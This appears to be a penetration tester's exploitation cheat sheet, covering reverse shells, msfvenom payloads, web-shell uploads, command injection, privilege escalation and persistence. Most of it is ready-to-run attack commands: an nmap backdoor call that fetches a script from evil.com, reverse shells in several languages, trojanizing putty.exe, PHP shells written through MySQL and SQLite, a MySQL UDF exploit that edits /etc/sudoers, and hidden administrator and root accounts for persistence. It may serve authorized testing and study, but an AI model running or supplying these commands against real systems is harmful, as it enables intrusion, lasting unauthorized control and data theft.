## EXPLOITATION

Info-Sheet

+ IP address: *target*
+ DNS-Domain name: *target-domain*
+ Host name: *host-name*
+ OS: *os*
+ Web Server (web server name): *web-server*
+ Web server modules: *web-modules*
+ Kernel: *os-type*
+ ftp version: *ftp-version*
+ telnet Version: *telnet-version*
+ SSH service version: *ssh-version*
+ SMTP version: *smtp-version*
+ tftp version:*tftp-version*
+ Workgroup: *workgroup*
+ Windows domain: *win-domain*
+ samba version : *samba-version*
+ database type: *database*
+ database version:*database-version*
+ mysql version: *mysql-version*
+ scripting languages:*scripting* 
+ possible users:*users*
+ possible passwords:*passwords*

If there are two or more of the same exploits then look for a date and try to pick the latest exploit first.

Refer to the penetration tab within the pen testing red workbook

•	Pentesting

•	Netcat

•	Msfvenom

•	Pentesting tricks part 1

•	Pentesting tricks part 2

•	Open or find the browser hackers handbook (kindle)

Refer to the web application penetration testing workbook

#### Nmap for exploit

nmap --script exploit 10.11.1.49

Go here and browse --script-args

https://nmap.org/nsedoc/categories/exploit.html

ftp-proftpd-backdoor.nse

ftp-vsftpd-backdoor.nse

irc-unrealircd-backdoor.nse

### Nmap using as an exploit

nmap --script ftp-proftpd-backdoor --script-args ftp-proftpd-backdoor.cmd=”wget http://evil.com/backdoor.pl & perl backdoor.pl” victim.tld

### Nmap to upload files via http

nmap -p80 --script http-fileupload-exploiter.nse

### Nmap using put method

nmap -p 80 *ip* --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'

## Netcat tricks

### Encrypted reverse shell with ncat from windows to linux

Set up the listener and make sure to allow authorization for the target to connect back to the listener

```
ncat -lvp 4444 --allow 10.11.8.58 --ssl

Then from the windows computer shovel the shell to linux

ncat --exec "cmd.exe" -nv 10.11.0.39 4444 --ssl
```

### Encrypted reverse shell with ncat from linux to linux

```
ncat -lvp 4444 --allow computer that will connect  --ssl

ncat -nv 127.0.0.1 4444 -e /bin/bash --ssl

```

### Netcat persistant

```
netcat -L

```

### Python Netcat usage and tricks

The one located inside viper payloads is just a chat server so far and needs work

```
Examples

./netcat.py -l -p 8888       server

hi client!                     typed on stdin

hi server!                     from client

^C                             bye

./netcat.py localhost 8888   client

hi client!                     from server

hi server!                     typed on stdin



```


### Viper Tricks

Change the connection ip address inside the ViperClient.exe file. Then build the .exe file with Client2exe.sh


### start viper-shell
```
from main folder

./start-teamserver.sh   

from services folder

./teamserverdev.py

run handler

set local ip address  > Then run .exe from target

```
### start viper web

```
startweb

$ Viper]}>> startweb
[*] - Starting the webserver reactor
[*] - The webserver is listening on 127.0.0.1:8090
[*] - The reactor is running
[*] - If you deploy the java signed applet then start netcat listener first with nc -lvp 443
$ Viper]}>> 

```

#### Viper Build fang // viperclient.exe

viper has a client and server built in. 

for now the best way to generate the client is to navigate to the payloads folder and chege the ip address within ViperClient.exe then

```
/home/viper-shell/application/payloads# ./Client2exe.sh

cp ViperClient.exe /home/viper-shell/application/www/html/ViperClient.exe

and

cp ViperClient.exe /var/www/html/public/ViperClient.exe
```


### start hander

handler

#### Viper download

```
download C:\Users\Administrator\Desktop\Tools\vuln.exe /home/viper-shell/application/loot/vuln.exe

you might have to do this twice
```

for linux you will have to get ViperClient.py to run on linux and then remove the last two libraries. Python will throw up an error when you run download. remove those libraries and you shall be good to download and upload on linux

#### Viper upload

upload python netcat shell from viper

```
do a dir or ls

get foldername

upload /home/viper-shell/application/payloads/netcat.py C:\Users\Administrator\Desktop\Tools\netcat.py


upload /home/viper-shell/application/payloads/netcat.py C:\Users\GHOST\Downloads
```

#### upload putty.exe

```
upload /root/Desktop/Windows/putty.exe c:\putty.exe
```

#### upload twisted python bind shell (backdoor) from viper

```

upload /home/viper-shell/application/payloads/backdoors/twisted-backdoor.py C:\Users\Administrator\Desktop\Tools\twisted-backdoor.py

```

#### Twisted backdoor needs some work

only works with linux right now and can't change dirs yet

```
#listener
#python backdoor.py 1337
#connect to back door with nc -vn <ip addr> port
#ls -la
#cat .connections.log



```
### Spawning a TTY Shell

Many of these will also allow you to escape jail shells. The top 3 would be my most successful in general for spawning from the command line.

python
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
bash
```
echo os.system('/bin/bash')
```

sh
```
/bin/sh -i
```

perl
```
perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";
```
ruby
```
ruby: exec "/bin/sh"
```
lua
```
lua: os.execute('/bin/sh')
```
From within IRB
```
exec "/bin/sh"
```
From within vi
```
:!bash
```
From within vi
```
:set shell=/bin/bash:shell
```
(From within nmap)
```
!sh
```


### Reverse Shell tricks

#### Reverse shell Cheat sheets

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

#### Bash

Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):

```

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

```

#### PERL

Here’s a shorter, feature-free version of the perl-reverse-shell:

```

perl -e 'use 
Socket;*dollar-sign*i="10.0.0.1";*dollar-sign*p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in(*dollar-sign*p,inet_aton(*dollar-sign*i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```
There’s also an alternative PERL revere shell here.

#### Python

This was tested under Linux Python 2.7

```

python -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

#### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

```
php -r '*dollar-sign*sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust php-reverse-shell.

#### Ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

#### Java

```
r = Runtime.getRuntime()

p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \*dollar-sign*line 2>&5 >&5; done"] as String[])

p.waitFor()
```

### backdoor a file:

wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe

```
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai 
-i 3 -b "\x00" -f exe -o puttyX.exe

```
## msfconsole

```
msfconsole -qx "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD windows/meterpreter/reverse_tcp; set ExitOnSession false; exploit -y -j"

```


## msfvenom

Listing payloads

```
msfvenom -l
```

help with formats

```
msfvenom --help-formats
```

list encoders

```
msfvenom --list encoders
```

list payloads

```
msfvenom --list payloads
```

### Windows Paylaods

#### Reverse Shell :

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
#### Bind Shell:
```
msfvenom -p windows/meterpreter/bind_tcp RHOST= (IP Address) LPORT=(Your Port) -f exe > bind.exe
```
#### Create User:
```
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
#### CMD shell:
```
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### Linux Payloads

#### Reverse Shell:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf >reverse.elf

msfvenom --platform linux --arch x86 -f elf --encoder generic/none --payload linux/x86/shell_reverse_tcp LHOST=10.11.0.39 LPORT=605 > lin-unix86-term-genbind-605.elf

msfvenom --platform linux --arch x64 -f elf --encoder generic/none --payload linux/x64/shell_reverse_tcp LHOST=10.11.0.39 LPORT=606 > lin-unix64-term-genbind-606.elf
```

#### Bind Shell:
```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
#### Generic Shell:
```
msfpayload generic/shell_bind_tcp ARCH=x86 PLATFORM=linux C

msfvenom -p generic/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > term.elf
```
### openbsd payloads

#### bsd linux elf:

```
msfvenom -p bsd/x86/shell/reverse_tcp LHOST=10.11.0.202 LPORT=21 -f elf --platform bsd -o /var/www/bsd21rev
```

### MAC Paylaods

#### Reverse Shell:
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
#### Bind Shell:
```
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
### Android Payloads

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=localhost LPORT=608 -R > android.apk
```

### Web Based Payloads

#### ASP

#### Reverse shell :

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.11.0.202 LPORT=443 -f asp -o shell.asp

msfvenom -a x64 --platform windows windows/shell_reverse_tcp LHOST=10.11.0.202 LPORT=443 -f asp -o ~/pwk_recon/mal_files/OS-
27060-64.asp

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=10.11.0.202 LPORT=6666 -f asp -o shell.asp
```
#### JSP

#### Reverse shell:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
#### WAR

#### Reverse Shell:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
#### php shells
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.202 LPORT=5555 -f raw > shell.php
```
Then you have to view the shell.php with a text editor and modify the start and end of the file. You must remove the comment or add in the correct php starting and ending code. remove // before starting php tag "<?php" and make sure the ending php tage is added to the file "?>" without quotes. 
```
msfvenom -p php/reverse_php LHOST=10.11.0.202 LPORT=443 -f raw > backdoorphp1.php

msfvenom -p php/reverse_php LHOST=10.11.0.202 LPORT=8080 -f raw > backdoorphp2.php
```

### Script Langauge payloads

#### Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
#### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py

msfvenom -p python/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) > evilpython.py
```
#### powershell
```
msfvenom -p cmd/windows/reverse_powershell LHOST=(IP Address) LPORT=(Your Port) > evil3.bat
```
#### Encoders:
```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
One can also use the -a to specify the architecture or the --platform



## msfvenom shells to find and replace and copy and paste quickly

create a folder in your web directory called shells-working

payload naming convention

```
OS//Comms direction//shell//port
```
find and replace the following

```
localhost = your attack station ip
```
copy and paste the following into a command shell after doing find and replace

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=localhost LPORT=600 -f exe > win86-reverse-met-600.exe

msfvenom -p windows/meterpreter/bind_tcp RHOST=localhost LPORT=601 -f exe > win86-bind-met-601.exe

msfvenom -p windows/adduser USER=hacker PASS=Passw0rd123! -f exe > win86-adduser.exe

msfvenom -p windows/shell/reverse_tcp LHOST=localhost LPORT=602 -f exe > prompt.exe

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=localhost LPORT=603 -f elf > lin86-reverse-met-603.elf

msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=localhost9 LPORT=604 -f elf > lin86-bind-met-604.elf

msfvenom --platform linux --arch x86 -f elf --encoder generic/none --payload linux/x86/shell_reverse_tcp LHOST=localhost LPORT=605 > lin-unix86-term-genrev-605.elf

msfvenom --platform linux --arch x64 -f elf --encoder generic/none --payload linux/x64/shell_reverse_tcp LHOST=localhost LPORT=606 > lin-unix64-term-genrev-606.elf

msfvenom --platform linux --arch x86 -f elf --encoder generic/none --payload linux/x86/shell_bind_tcp LHOST=localhost LPORT=607 > lin-unix86-term-genbind-607.elf

msfvenom -p android/meterpreter/reverse_tcp LHOST=localhost LPORT=608 -R > android.apk

```

#### MSFvenom Payload Creator (MSFPC)

https://github.com/g0tmi1k/mpc


### WEB APPLICATION EXPLOITATION


Hack steps

•	Analyze the application

•	Test Client side controls

•	Test Authentication Mechanisms

•	Test Session Management Mechanism

•	Test Access Controls

•	Test For input based vulnerabilities

•	Test for function-specific input vulns

•	Test for logic flaws

•	Test for shared hosting vulns

•	Test for web server vulns

•	Misc Checks

#### ATTACK SESSION MANAGEMENT

Hack Steps

•	Spider host

•	Open chapter 7 of the browser hacker handbook

•	Look for hidden logins or comments within the web app

•	Observe which items are passed to the browser after authentication

•	Find a page that is certainly session-dependent (such as a user-specific “My details” page) and make several requests for it 
systematically removing each item you suspect as being the token. If removing an item causes the page to not be returned then this may confirm that an item is a session token. See burp repeater)

#### ATTACK ACCESS CONTROLS

Hack Steps

Look for admin pages or other user access

Ask yourself

•	Do application functions give individual users access to a particular subset of data that belongs to them?

•	Are there different levels of user such as managers, supervisors, guests and so on, who are granted access to different 
functions?

•	Do administrators use functionality that is built into the same application in order to configure and monitor it?

•	What functions or data resources within the application have you identified that would most likely enable you to escalate 
your current privileges

•	Look inside the browser hacker handbook chapter 7 for attacking access controls

#### INJECTING CODE

Hack steps

means web app is not written to filter of validate our input. This allows us to append and run system commands.

```
the "&", "&&" or "|" symbol to append a command and the ";" to separate multiple commands

examples

where form says hostname or IP then enter 

192.168.1.1. & dir
192.168.1.1. & ls
192.168.1.1. & cat /etc/passwd
192.168.1.1. & cd \ & dir
192.168.1.1. & net user
192.168.1.1. & dir & ipconfig

```

•	Refer to web app pentesting within the advanced kali for pentesting book. 

•	Inject into SQL, PHP, SOAP, LDAP

•	Supply unexpected syntax that may cause problems within the context of the particular interpreted language

•	Identify any anomalies in the applications response that may indicate the presence of a code injection vulnerability

•	If any error messages are received, examine these to obtain evidence about the problem that occurred on the server

•	If necessary systematically modify your initial input in relevant ways in an attempt to confirm or disprove your tentative 
diagnosis of a vulnerability

•	Construct a proof of concept test that causes a safe command to be executed in a verifiable way to conclusively prove that an exploitable code injection flaw exists

•	Exploit the vulnerability by leveraging the functionality of the target language and component to achieve your objections. 

•	Refer to the Web APP hacking hackers handbook inside kindle



#### PATH TRAVERSAL

Hack steps

•	Modify the parameters value to insert an arbitrary subdirectory and a single traversal sequence.

•	File=foo/file.txt

•	File=foo/bar../file1.txt

•	If the applications behavior is identical in the two cases then it may be vulnerable. You should proceed directly to 
attempting to access a different file by traversing above the start directory.

•	If the application is different than it may be blocking, stripping or sanitizing traversal sequences. 

•	Refer to the Web APP hacking hackers handbook inside kindle
•	Refer to your web app hackers workbook

#### ATTACKING APPICATION LOGIC

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to the real world logic flaws section

•	Refer to your web app hackers workbook

#### ATTACKING OTHER USERS

•	XXS

•	XSRF

•	Session Fixation

•	Exploit browser vulnerability’s

•	Try to do browser scrapper attacks

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

#### AUTOMATING WEB ATTACKS

#### ENUMERATING IDENTIFIERS / NAMES / ITEMS / DATA / RESOURCES

•	Application logic functions return messages

•	Many apps use identifiers to refer to resources
•	If sessions tokens generated by application can be predicted you may be able to hijack

o	200 - default response code meaning “ok”

o	301 or 302 - A redirection

o	401 - 403 - request not authorized or allowed

o	404 - request resource was not found

o	500 - the server encountered an error when processing the request response length

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

##### HARVESTING USEFUL DATA

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

•	Use harvesting tools

##### FUZZING FOR COMMON VULNS

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

•	Burp intruder location 7786 kindle web app hacking hackers handbook

#### EXPLOITING INFORMATION DISCLOSURE

•	Probe application for vulns, submit crafted attack, monitor the applications responses to identify error messages that may be useful

•	Gather published information

•	Chapter 14 in the web app hacking handbook

##### ATTACK COMPILED APPLICATION

•	Buffer overflow vulns

•	Integer Vulns

•	Format String Vulns

•	Review shell coders hanbook

•	Chapter 14 in the web app hacking handbook

#### ATTACK APPLICATION ARCHITECTURE

•	Tiered

•	Shared hosting and application service providers

#### ATTACKING WEB SERVER


•	Vulnerable web server configuration

•	Look for or inject a phpinfo.php page

•	Look for indexes of directorys

•	Look for vulnerable web software

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

#### WEB HACKERS TOOKIT

•	WEBBROWSERS

•	Tamper Data

•	Live HTTP Headers

•	Developers TOOLS

•	COOKIE Watchers

•	Vulnerability scanners

•	Refer to the Web APP hacking hackers handbook inside kindle

### SQL Exploitation

REF: SQL Injection attacks and defenses

#### Try and upload a PHP shell through mysql if if you get root

```
Mysql > Select "<?php echo shell_exec(*dollar-sign*_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```
Once done, we can navigate to https://*IPAddress*/blogblog/wp-content/uploads/, and we should see our php shell in there.

Once inside the shell, let’s check to see if it works by appending ?cmd=ifconfig to the end of the url. This should give us a 

dirty output - but will let us know if the shell works properly.
 
WEB Shell to shell

Nc –lvp 443

```
Shell.php?cmd=python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### mysql exploitation

https://g0blin.co.uk/lord-of-the-root-vulnhub-writeup/

If mysql is runing as root so i tried MySQL 4.x/5.0 - User-Defined Function Local Privilege Escalation Exploit

it is exploit that gets mysql to run system commands

cat /usr/share/exploitdb/platforms/linux/local/1518.c

copied it into VM

```
gcc -g -c raptor_udf2.c

gcc -g -shared -Wl,-soname,raptor_udf2.so -oraptor_udf2.so raptor_udf2.o -lc

```
mysql -u root -p   (password : darkshadow )

mysql> use mysql;

mysql> create table foo(line blob);

mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

mysql> create function do_system returns integer soname 'raptor_udf2.so';

mysql> select * from mysql.func;

+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+

1 row in set (0.00 sec)

mysql> select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers');

mysql> exit

sudo bash

whoami

root

cat Flag.txt


### SQL light 3 injection
```
Hits from the bits

@_gwae

SQLite Injection

Introduction

SQLite is a small RDBMS, written in C. Due to his size, it's widely used in embedded systems (GPS, Android, etc) - you don't 

need any server or any daemon : everything works thanks to a complete set of functions in nearly all languages.

Getting started

The easiest way to discover SQLite tricks is to try it directly on the shell !

In SQLite, the way to get the version is :

sqlite> SELECT sqlite_version();

3.7.17

Nothing hard when it's time to create some tables...

sqlite> CREATE TABLE demo (data TEXT);

sqlite> INSERT INTO demo (data) VALUES ('junk');

In the case of an SQL injection, e.g. in a table with 3 columns, we'll be in the following case, which will confirm that we are 

in presence of an SQLite database (I assume you already made some SQL injections with MySQL) :

xxx?id=-2 union select sqlite_version(), NULL, NULL--

Listing tables

It's simpler than working with MySQL... or just more verbose.

xxx?id=-2 union select name, NULL, NULL from sqlite_master--

And the best feature, we can get the structure of any table, directly in the SQL language :

sqlite> SELECT sql FROM sqlite_master WHERE name = 'demo';

CREATE TABLE demo (data TEXT)

Dropping a shell

Assume that we want to write the following PHP shell (the <pre> tag is here to have a correct output format when running 

commands like ls) :

<pre><?php echo shell_exec(*dollar-sign*_GET['c']); ?></pre>

sqlite> ATTACH DATABASE '/var/www/uploads/poney.php' as pwn;

sqlite> CREATE TABLE pwn.shell (code TEXT);

sqlite> INSERT INTO pwn.shell (code) VALUES ("<pre><?php echo shell_exec(*dollar-sign*_GET['c']); ?></pre>");

As usual, the only requirement is to have a writable directory on the server - uploads/ or cache/ can be useful. If they don't 

exist, you can still use google dorks (site:www.website.tld) or DirBuster.

Blind Injection

admin' AND SUBSTR(password, i, 1) = 'a'

```

### PHP webshell exploitation 

git clone https://github.com/b374k/b374k.git

git clone https://github.com/tennc/webshell



## GCC compiling

gcc compile

•	For i386 & ppc compile with the command;

•	gcc -w -o exploit exploit.c

•	For x86_64 kernel and ppc64 Compile as;

•	gcc -w -m64 -o exploit exploit.c

compile windows exploits on linux and run with wine

•	apt-get install mingw32

•	apt-get install mingw64

i586-mingw32msvc-gcc *exploit.c*

you may need to add in the winsock library to command syntax

•	i586-mingw32msvc-gcc *exploit.c* -lws2_32 -o *exploit-windows.exe*

#### other gcc commands

gcc -pthread dirty.c -o dirty -lcrypt

gcc -Wl,--hash-style=both -o exploit 9545.c

#### You may need to remove SSL

gcc apache-magika.c -o apache-magika -lssl

#### cross compiling

apt-get install mingw-w64

i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe


wine 646.exe 10.11.1.35

setup reverse listener

### linux exploitation tools

https://github.com/longld/peda

#### gdb peda

```

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

```
checksec

shellcode generate x86/linux exec


```




### Windows exploitation tools



## Persistance

### Windows Persistance

Persistance for windows

1.	run persistence -U -i 5 -p 443 -r 10.11.0.202

2.	run persistence -U -i 5 -p 666 -r 10.11.0.202

3.	set  LPORT 443

4.	exploit

or

•	create users and hide them

•	create backdoors in dll files

•	create a command hidden promt

MSF> execute -H -f cmd -i

•	Create a service account

net user Service_Account password /ADD

net localgroup administrators Service_Account /ADD

•	enable telnet service

meterpreter> run gettelnet -e

### VNC INJECT

Meterpreter VNCINJECT module

#### Linux Persistance

1.	persistance for linux
2.	use exploit/linux/local/cron_persistence
3.	set session 1
4.	set payload cmd/unix/reverse_perl
5.	set LHOST 10.11.0.202
6.	set LPORT 444
7.	run

useradd -o -u 0 hacker  -G root  -d /home/hacker -p P@ssw0rd123!  -m

#### NETCAT AS PERSISTANCE

REF: Mastering Kali Linux for Advanced penetration testing
